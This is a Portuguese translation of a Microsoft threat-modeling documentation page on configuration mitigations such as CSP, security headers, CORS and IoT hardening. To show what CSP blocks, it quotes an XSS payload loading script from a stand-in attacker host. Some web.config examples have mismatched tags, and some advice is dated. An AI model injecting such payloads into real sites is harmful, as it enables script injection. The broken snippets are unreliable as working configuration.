---
title: Gerenciamento de configurações - Microsoft Threat Modeling Tool - Azure | Microsoft Docs
description: atenuações de ameaças expostas na ferramenta de modelagem de ameaças
services: security
documentationcenter: na
author: jegeib
manager: jegeib
editor: jegeib
ms.assetid: na
ms.service: security
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 02/07/2017
ms.author: jegeib
ms.openlocfilehash: 284d0e888b89d340088f770af22c026a861a4685
ms.sourcegitcommit: 3102f886aa962842303c8753fe8fa5324a52834a
ms.translationtype: MT
ms.contentlocale: pt-BR
ms.lasthandoff: 04/23/2019
ms.locfileid: "60610719"
---
# <a name="security-frame-configuration-management--mitigations"></a>Estrutura de segurança: gerenciamento de configurações | Atenuações 
| Produto/Serviço | Artigo |
| --------------- | ------- |
| **Aplicativo Web** | <ul><li>[Implementar a Política de Segurança de Conteúdo (CSP) e desabilitar o JavaScript embutido](#csp-js)</li><li>[Habilitar o filtro XSS do navegador](#xss-filter)</li><li>[Os aplicativos ASP.NET devem desabilitar o rastreamento e a depuração antes da implantação](#trace-deploy)</li><li>[Acessar JavaScripts de terceiros somente de fontes confiáveis](#js-trusted)</li><li>[Garantir que as páginas ASP.NET autenticadas incluam defesas contra adulterações de interface do usuário ou furto de clique](#ui-defenses)</li><li>[Garantir que apenas fontes confiáveis sejam permitidas se o CORS estiver habilitado em aplicativos Web do ASP.NET](#cors-aspnet)</li><li>[Habilitar o atributo ValidateRequest em páginas ASP.NET](#validate-aspnet)</li><li>[Usar as versões mais recentes de bibliotecas JavaScript hospedadas localmente](#local-js)</li><li>[Desabilitar a detecção automática de MIME](#mime-sniff)</li><li>[Remover cabeçalhos de servidor padrão nos sites do Microsoft Azure para evitar impressões digitais](#standard-finger)</li></ul> |
| **Banco de dados** | <ul><li>[Configurar um Firewall do Windows para acesso ao Mecanismo de Banco de Dados](#firewall-db)</li></ul> |
| **API da Web** | <ul><li>[Garantir que apenas fontes confiáveis sejam permitidas se o CORS estiver habilitado na ASP.NET Web API](#cors-api)</li><li>[Criptografar as seções dos arquivos de configuração da API Web que contêm dados confidenciais](#config-sensitive)</li></ul> |
| **Dispositivo IoT** | <ul><li>[Garantir que todas as interfaces de administrador sejam protegidas com credenciais fortes](#admin-strong)</li><li>[Garantir que um código desconhecido não seja executado em dispositivos](#unknown-exe)</li><li>[Criptografar o sistema operacional e partições adicionais do dispositivo IoT com o BitLocker](#partition-iot)</li><li>[Garantir que apenas o mínimo de serviços/recursos estejam habilitados nos dispositivos](#min-enable)</li></ul> |
| **Gateway de Campo de IoT** | <ul><li>[Criptografar o sistema operacional e partições adicionais do Gateway de Campo IoT com o BitLocker](#field-bit-locker)</li><li>[Garantir que as credenciais de logon padrão do gateway de campo sejam alteradas durante a instalação](#default-change)</li></ul> |
| **Gateway de Nuvem IoT** | <ul><li>[Garantir que o Gateway de Nuvem implemente um processo para manter atualizado o firmware de dispositivos conectados](#cloud-firmware)</li></ul> |
| **Limite de confiança de computador** | <ul><li>[Garantir que os controles de segurança de ponto de extremidade estejam configurados nos dispositivos de acordo com as políticas organizacionais](#controls-policies)</li></ul> |
| **Armazenamento do Azure** | <ul><li>[Garantir o gerenciamento seguro das chaves de acesso do Armazenamento do Azure](#secure-keys)</li><li>[Garantir que apenas fontes confiáveis sejam permitidas se o CORS estiver habilitado no Armazenamento do Azure](#cors-storage)</li></ul> |
| **WCF** | <ul><li>[Habilitar o recurso de limitação do serviço WCF](#throttling)</li><li>[Divulgação de informações do WCF por meio de metadados](#info-metadata)</li></ul> | 

## <a id="csp-js"></a>Implementar a Política de Segurança de Conteúdo (CSP) e desabilitar o JavaScript embutido

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicativo Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | [Uma introdução à Política de Segurança de Conteúdo](https://www.html5rocks.com/en/tutorials/security/content-security-policy/), [Referência da Política de Segurança de Conteúdo](https://content-security-policy.com/), [Recursos de segurança](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [Introdução à Política de Segurança de Conteúdo](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy), [Posso usar a CSP?](https://caniuse.com/#feat=contentsecuritypolicy) |
| **Etapas** | <p>A CSP (Política de Segurança de Conteúdo) é um mecanismo de defesa aprofundado, um padrão de W3C, que permite aos proprietários do aplicativo Web ter controle sobre os conteúdos inseridos em seus sites. A CSP é adicionada como um cabeçalho de resposta HTTP no servidor Web e é aplicada pelos navegadores do cliente. Ela é uma política baseada na lista de permissões; um site pode informar um conjunto de domínios confiáveis, dos quais conteúdos ativos, como JavaScript, podem ser carregados.</p><p>A CSP oferece os seguintes benefícios de segurança:</p><ul><li>**Proteção contra XSS:** se uma página for vulnerável a XSS, um invasor poderá explorá-la de duas maneiras:<ul><li>Injetar `<script>malicious code</script>`: essa exploração não funcionará devido à primeira restrição básica da CSP.</li><li>Injetar `<script src=”http://attacker.com/maliciousCode.js”/>`: essa exploração não funcionará, porque o domínio controlado pelo invasor não estará na lista de domínios permitidos da CSP.</li></ul></li><li>**Controle sobre o vazamento de dados:** se algum conteúdo mal-intencionado em uma página da Web tentar se conectar a um site externo e roubar dados, a conexão será anulada pelo CSP. Isso acontece porque o domínio de destino não estará na lista de permissões da CSP.</li><li>**Defesa contra furto de clique:** o furto de clique é uma técnica de ataque na qual um invasor adultera um site genuíno e faz com que os usuários cliquem nos elementos de sua interface do usuário. Para se proteger contra o furto de clique atualmente, basta configurar um cabeçalho de resposta X-Frame-Options. Nem todos os navegadores respeitam esse cabeçalho, por isso a CSP será a melhor maneira de se defender contra o furto de clique</li><li>**Relatórios de ataque em tempo real:** se houver um ataque de injeção em um site com o CSP habilitado, os navegadores disparam automaticamente uma notificação para um ponto de extremidade configurado no servidor Web. Dessa forma, a CSP atua como um sistema de aviso em tempo real.</li></ul> |

### <a name="example"></a>Exemplo
Política de exemplo: 
```csharp
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
Essa política permite que os scripts sejam carregados somente no servidor do aplicativo da web e no servidor do Google Analytics. Os scripts carregados em qualquer outro site serão rejeitados. Quando a CSP estiver habilitada em um site, os seguintes recursos serão desabilitados automaticamente para atenuar ataques de XSS. 

### <a name="example"></a>Exemplo
Os scripts embutido não serão executados. Veja abaixo exemplos de scripts embutidos: 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick=”function(){}”>
javascript:alert(1);
```

### <a name="example"></a>Exemplo
As cadeias de caracteres não serão avaliadas como código. 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <a id="xss-filter"></a>Habilitar o filtro XSS do navegador

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicativo Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | [Filtro de proteção contra XSS](https://www.owasp.org/index.php/List_of_useful_HTTP_headers#X-XSS-Protection) |
| **Etapas** | <p>A configuração do cabeçalho de resposta X-XSS-Protection controla o filtro de scripts entre sites do navegador. Esse cabeçalho de resposta pode ter valores os seguintes valores:</p><ul><li>`0:` - esse valor desabilitará o filtro.</li><li>`1: Filter enabled` - se for detectado um ataque de script entre sites, o navegador corrigirá a página para interromper o ataque.</li><li>`1: mode=block : Filter enabled`. em vez de corrigir a página, quando um ataque de XSS for detectado, o navegador impedirá a renderização da página.</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. o navegador corrigirá a página e relatará a violação.</li></ul><p>Essa é uma função do Chromium que utiliza relatórios de violação da CSP para enviar detalhes para um URI de sua escolha. As duas última opções são consideradas valores seguros.</p>|

## <a id="trace-deploy"></a>Os aplicativos ASP.NET devem desabilitar o rastreamento e a depuração antes da implantação

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicativo Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | [Visão geral sobre depuração do ASP.NET](https://msdn.microsoft.com/library/ms227556.aspx), [Visão geral sobre rastreamento do ASP.NET](https://msdn.microsoft.com/library/bb386420.aspx), [Como: habilitar o rastreamento de um aplicativo ASP.NET](https://msdn.microsoft.com/library/0x5wc973.aspx), [Como: habilitar a depuração de aplicativos do ASP.NET](https://msdn.microsoft.com/library/e8z01xdh(VS.80).aspx) |
| **Etapas** | Quando o rastreamento estiver habilitado para a página, todos os navegadores que a solicitarem também obterão as informações de rastreamento que contêm dados do fluxo de trabalho e do estado interno do servidor. Elas podem ser informações confidenciais de segurança. Quando a depuração estiver habilitada para a página, os erros ocorridos no servidor serão apresentados ao navegador como uma pilha de dados de rastreamento. Esses dados podem conter informações confidenciais de segurança sobre fluxo de trabalho do servidor. |

## <a id="js-trusted"></a>Acessar JavaScripts de terceiros somente de fontes confiáveis

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicativo Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | N/D  |
| **Etapas** | os JavaScripts de terceiros devem ser referenciados somente de fontes confiáveis. Os pontos de extremidade de referência devem estar sempre no SSL. |

## <a id="ui-defenses"></a>Garantir que as páginas ASP.NET autenticadas incluam defesas contra adulterações de interface do usuário ou furto de clique

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicativo Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | [Folha de dados do OWASP sobre mecanismos de proteção contra furto de clique](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet), [Internals IE – Combatendo o furto de clique com X-Frame-Options](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) |
| **Etapas** | <p>o furto de clique, também conhecido como "ataque de adulteração de interface do usuário", ocorre quando um invasor utiliza várias camadas transparentes ou opacas para fazer com que o usuário clique em um botão ou link de outra página enquanto, na verdade, ele pretendia clicar na página do nível superior.</p><p>Para aplicar essas camadas, é preciso criar uma página mal-intencionada com um iframe para carregar a página da vítima. Assim, o invasor é "sequestra" os cliques destinados a uma página e os encaminha para outra página, que provavelmente pertence a outro aplicativo, domínio ou ambos. Para evitar esse tipo de ataque, defina os cabeçalhos de resposta HTTP de X-Frame-Options adequados que instruem o navegador a não permitir enquadramentos de outros domínios</p>|

### <a name="example"></a>Exemplo
O cabeçalho X-FRAME-OPTIONS pode ser definido com o arquivo web.config do IIS. O snippet de código do arquivo web.config para sites que nunca devem ser enquadrados: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a>Exemplo
O código do arquivo web.config para sites que só devem ser enquadrados por páginas do mesmo domínio: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <a id="cors-aspnet"></a>Garantir que apenas fontes confiáveis sejam permitidas se o CORS estiver habilitado em aplicativos Web do ASP.NET

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicativo Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Web Forms, MVC5 |
| **Atributos**              | N/D  |
| **Referências**              | N/D  |
| **Etapas** | <p>A segurança do navegador impede que uma página da Web envie solicitações do AJAX para outro domínio. Essa restrição se chama política da mesma origem e impede que um site mal-intencional leia dados confidenciais de outro site. No entanto, às vezes pode ser necessário expor APIs de forma segura para que os outros sites possam utilizá-las. O CORS (Compartilhamento de Recursos entre Origens) é um padrão W3C que permite ao servidor relaxar a política de mesma origem. Usando o CORS, um servidor pode explicitamente permitir algumas solicitações entre origens e rejeitar outras.</p><p>O CORS é mais seguro e flexível do que técnicas anteriores, como o JSONP. Essencialmente, habilitar o CORS significa adicionar alguns cabeçalhos de resposta HTTP (Access - Control-*) ao aplicativo da Web. Isso pode ser feito de duas formas.</p>|

### <a name="example"></a>Exemplo
Se o acesso ao arquivo Web.config estiver disponível, o CORS poderá ser adicionado ao seguinte código: 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="https://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a>Exemplo
Se o acesso ao arquivo web.config não estiver disponível, o CORS pode ser adicionado no seguinte código CSharp: 
```csharp
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://example.com")
```

Observe que é essencial garantir que a lista de origens no atributo "Access-Control-Allow-Origin" esteja definida como um conjunto finito e confiável de origens. Se isso não for configurado corretamente (por exemplo, definindo o valor como '*'), sites mal-intencionados poderão disparar solicitações entre origens para o aplicativo da Web sem restrições, tornando o aplicativo vulnerável a ataques de CSRF. 

## <a id="validate-aspnet"></a>Habilitar o atributo ValidateRequest em páginas ASP.NET

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicativo Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Web Forms, MVC5 |
| **Atributos**              | N/D  |
| **Referências**              | [Solicitar validação - evitando ataques de script](https://www.asp.net/whitepapers/request-validation) |
| **Etapas** | <p>A validação de solicitação, um recurso do ASP.NET oferecido desde a versão 1.1, impede que o servidor aceite conteúdo sem HTML codificado. Esse recurso foi criado para evitar alguns ataques de injeção de script, em que o código de script ou HTML do cliente pode ser enviado inadvertidamente para um servidor, armazenado e, em seguida, apresentado a outros usuários. Ainda recomendamos que você valide todos os dados de entrada e os codifique com HTML quando for apropriado.</p><p>A validação de solicitação é executada pela comparação de todos os dados de entrada com uma lista de valores potencialmente perigosos. Se uma correspondência for encontrada, o ASP.NET gera uma `HttpRequestValidationException`. Por padrão, o recurso de validação de solicitação está habilitado.</p>|

### <a name="example"></a>Exemplo
No entanto, esse recurso pode ser desabilitado no nível da página: 
```XML
<%@ Page validateRequest="false" %> 
```
ou no nível do aplicativo: 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
Observe que o recurso de validação de solicitação não tem suporte no pipeline do MVC6 nem faz parte dele. 

## <a id="local-js"></a>Usar as versões mais recentes de bibliotecas JavaScript hospedadas localmente

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicativo Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | N/D  |
| **Etapas** | <p>Os desenvolvedores que usam bibliotecas JavaScript padrão, como a JQuery, devem usar as versões aprovadas das bibliotecas JavaScript comuns que não contêm falhas de segurança conhecidas. Uma boa prática é usar a versão mais recente das bibliotecas, porque elas contêm correções de segurança para vulnerabilidades conhecidas em suas versões anteriores.</p><p>Se a versão mais recente não puder ser usada por motivos de compatibilidade, as versões mínimas abaixo devem ser usadas.</p><p>Versões mínimas aceitáveis:</p><ul><li>**JQuery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>JQuery Validate 1.9</li><li>JQuery Mobile 1.0.1</li><li>JQuery Cycle 2.99</li><li>JQuery DataTables 1.9.0</li></ul></li><li>**Ajax Control Toolkit**<ul><li>Ajax Control Toolkit 40412</li></ul></li><li>**ASP.NET Web Forms e Ajax**<ul><li>ASP.NET Web Forms e Ajax 4</li><li>ASP.NET Ajax 3.5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>Nunca carregue quaisquer bibliotecas JavaScript de sites externos, como CDNs públicas.</p>|

## <a id="mime-sniff"></a>Desabilitar a detecção automática de MIME

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicativo Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | [Segurança do IE8 parte V: proteção abrangente](https://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx), [Tipo de MIME](https://en.wikipedia.org/wiki/Mime_type) |
| **Etapas** | O cabeçalho X-Content-Type-Options é um cabeçalho HTTP que permite aos desenvolvedores especificar que seus conteúdos não devem ter o MIME detectado. Esse cabeçalho foi criado para reduzir os ataques de detecção de MIME. Para cada página que pode incluir conteúdo controlável pelo usuário, você deve usar o cabeçalho HTTP X-Content-Type-Options:nosniff. Para habilitar globalmente o cabeçalho necessário para todas as páginas do aplicativo, você tem as seguintes opções:|

### <a name="example"></a>Exemplo
Adicionar o cabeçalho no arquivo web.config se o aplicativo estiver hospedado no Internet Information Services (IIS) 7 ou posterior. 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a>Exemplo
Adicionar o cabeçalho usando a Aplication\_BeginRequest global. 
```csharp
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a>Exemplo
Implementar o módulo HTTP personalizado. 
```csharp
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a>Exemplo
Você pode habilitar o cabeçalho necessário apenas para páginas específicas adicionando-o a respostas individuais. 

```csharp
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <a id="standard-finger"></a>Remover cabeçalhos de servidor padrão nos sites do Microsoft Azure para evitar impressões digitais

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicativo Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | Tipo de ambiente - Azure |
| **Referências**              | [Removendo cabeçalhos de servidor padrão nos sites do Microsoft Azure](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
| **Etapas** | Cabeçalhos como Server, X-Powered-By e X-AspNet-Version revelam informações sobre o servidor e as tecnologias subjacentes. É recomendável suprimir esses cabeçalhos, impedindo, assim, a impressão digital do aplicativo |

## <a id="firewall-db"></a>Configurar um Firewall do Windows para acesso ao Mecanismo de Banco de Dados

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Banco de dados | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | SQL Azure, OnPrem |
| **Atributos**              | N/D, Versão do SQL - V12 |
| **Referências**              | [Como configurar um firewall de banco de dados SQL do Azure](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [Configurar um Firewall do Windows para conceder acesso ao mecanismo do banco de dados](https://msdn.microsoft.com/library/ms175043) |
| **Etapas** | Os sistemas de firewall ajudam a impedir o acesso não autorizado aos recursos do computador. Para acessar uma instância do mecanismo de banco de dados do SQL Server por meio de um firewall, você precisa configurar o firewall no computador que está executando o SQL Server para permitir o acesso. |

## <a id="cors-api"></a>Garantir que apenas fontes confiáveis sejam permitidas se o CORS estiver habilitado na ASP.NET Web API

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | API Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | MVC 5 |
| **Atributos**              | N/D  |
| **Referências**              | [Permitindo solicitações entre origens na ASP.NET Web API 2](https://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [ASP.NET Web API - suporte ao CORS na ASP.NET Web API 2](https://msdn.microsoft.com/magazine/dn532203.aspx) |
| **Etapas** | <p>A segurança do navegador impede que uma página da Web envie solicitações do AJAX para outro domínio. Essa restrição se chama política da mesma origem e impede que um site mal-intencional leia dados confidenciais de outro site. No entanto, às vezes pode ser necessário expor APIs de forma segura para que os outros sites possam utilizá-las. O CORS (Compartilhamento de Recursos entre Origens) é um padrão W3C que permite ao servidor relaxar a política de mesma origem.</p><p>Usando o CORS, um servidor pode explicitamente permitir algumas solicitações entre origens e rejeitar outras. O CORS é mais seguro e flexível do que técnicas anteriores, como o JSONP.</p>|

### <a name="example"></a>Exemplo
No arquivo App_Start/WebApiConfig.cs, adicione o seguinte código ao método WebApiConfig.Register. 
```csharp
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a>Exemplo
O atributo EnableCors pode ser aplicado aos métodos de ação em um controlador da seguinte maneira: 

```csharp
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

Observe que é essencial garantir que a lista de origens no atributo EnableCors esteja definida como um conjunto finito e confiável de origens. Se isso não for configurado corretamente (por exemplo, definindo o valor como '*'), sites mal-intencionados poderão disparar solicitações entre origens para a API sem restrições, tornando a API vulnerável a ataques de CSRF. O atributo EnableCors pode ser decorado no nível do controlador. 

### <a name="example"></a>Exemplo
Para desabilitar o CORS em um determinado método de uma classe, use o atributo DisableCors conforme mostrado abaixo: 
```csharp
[EnableCors("https://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of the [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | API Web | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | MVC 6 |
| **Atributos**              | N/D  |
| **Referências**              | [Permitindo solicitações entre origens (CORS) no ASP.NET Core 1.0](https://docs.asp.net/en/latest/security/cors.html) |
| **Etapas** | <p>No ASP.NET 1.0, o CORS pode ser habilitado com o middleware ou o MVC. Quando o MVC é usado para habilitar o CORS, os mesmos serviços do CORS são usados, mas o middleware CORS não.</p>|

**Abordagem 1** Habilitar CORS com middleware: para habilitar o CORS para todo o aplicativo, adicione o middleware do CORS ao pipeline de solicitação usando o método da extensão UseCors. Uma política entre origens pode ser especificada quando o middleware do CORS for adicionado usando a classe CorsPolicyBuilder. Há duas maneiras de fazer isso:

### <a name="example"></a>Exemplo
A primeira é chamar UseCors com um lambda. O lambda utiliza um objeto CorsPolicyBuilder: 
```csharp
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("https://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a>Exemplo
A segunda é definir uma ou mais políticas CORS e, em seguida, selecionar a política pelo nome no tempo de execução. 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("https://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

**Abordagem 2** Habilitar CORS no MVC: os desenvolvedores podem usar o MVC como uma alternativa à aplicação de um CORS específico por ação, por controlador ou globalmente para todos os controladores.

### <a name="example"></a>Exemplo
Por ação: para especificar uma política de CORS para uma ação específica, adicione o atributo [EnableCors] à ação. Especifique o nome da política. 
```csharp
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a>Exemplo
Por controlador: 
```csharp
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a>Exemplo
Globalmente: 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
Observe que é essencial garantir que a lista de origens no atributo EnableCors esteja definida como um conjunto finito e confiável de origens. Se isso não for configurado corretamente (por exemplo, definindo o valor como '*'), sites mal-intencionados poderão disparar solicitações entre origens para a API sem restrições, tornando a API vulnerável a ataques de CSRF. 

### <a name="example"></a>Exemplo
Para desabilitar o CORS para um controlador ou uma ação, use o atributo [DisableCors]. 
```csharp
[DisableCors]
    public IActionResult About()
    {
        return View();
    }
```

## <a id="config-sensitive"></a>Criptografar as seções dos arquivos de configuração da API Web que contêm dados confidenciais

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | API Web | 
| **Fase do SDL**               | Implantação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | [Como: Criptografar seções de configuração no ASP.NET 2.0 usando DPAPI](https://msdn.microsoft.com/library/ff647398.aspx), [Especificar um provedor de configuração protegido](https://msdn.microsoft.com/library/68ze1hb2.aspx), [Como usar o Azure Key Vault para proteger os segredos do aplicativo](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
| **Etapas** | Arquivos de configuração, tais como Web. config e appsettings.json geralmente são usados para armazenar informações confidenciais, incluindo nomes de usuários, senhas, cadeias de conexão de banco de dados e chaves de criptografia. Se você não proteger essas informações, o aplicativo ficará vulnerável a usuários mal-intencionados, que podem obter informações sigilosas, como nomes usuários e senhas de contas, nomes de bancos de dados e nomes de servidores. Com base no tipo de implantação (no Azure ou local), criptografe as seções confidenciais dos arquivos de configuração usando a DPAPI ou serviços, como o Azure Key Vault. |

## <a id="admin-strong"></a>Garantir que todas as interfaces de administrador sejam protegidas com credenciais fortes

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Dispositivo IoT | 
| **Fase do SDL**               | Implantação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | N/D  |
| **Etapas** | Quaisquer interfaces administrativas expostas pelo gateway de campo ou pelo dispositivo devem ser protegidas com credenciais fortes. Outras interfaces expostas, como Wi-Fi, SSH, compartilhamentos de arquivos e FTP, também devem ser protegidas com credenciais fortes. Senhas fracas padrão não devem ser usadas. |

## <a id="unknown-exe"></a>Garantir que um código desconhecido não seja executado em dispositivos

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Dispositivo IoT | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | [Habilitar a inicialização segura e a Criptografia do dispositivo do BitLocker no Windows 10 IoT Core](https://docs.microsoft.com/windows/iot-core/secure-your-device/securebootandbitlocker) |
| **Etapas** | A Inicialização Segura de UEFI restringe o sistema a permitir somente a execução dos binários assinados por uma autoridade especificada. Esse recurso impede que códigos desconhecidos sejam executados na plataforma e enfraqueçam sua postura de segurança. Habilite a Inicialização Segura de UEFI e restrinja a lista de autoridades de certificação confiáveis para assinatura de código. Assine todos os códigos implantados no dispositivo usando uma das autoridades confiáveis. |

## <a id="partition-iot"></a>Criptografar o sistema operacional e partições adicionais do dispositivo IoT com o BitLocker

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Dispositivo IoT | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | N/D  |
| **Etapas** | O Windows 10 IoT Core implementa uma versão leve da Criptografia do dispositivo do BitLocker, que tem uma dependência forte na presença de um TPM na plataforma, incluindo o protocolo preOS necessário na UEFI que realiza as medições necessárias. Essas medições do preOS garantem que o sistema operacional posteriormente tenha um registro definitivo de como ele foi iniciado. Use o BitLocker para criptografar as partições do sistema operacional e outras partições também, caso elas armazenem dados confidenciais. |

## <a id="min-enable"></a>Garantir que apenas o mínimo de serviços/recursos estejam habilitados nos dispositivos

| Title                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Dispositivo IoT | 
| **Fase do SDL**               | Implantação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | N/D  |
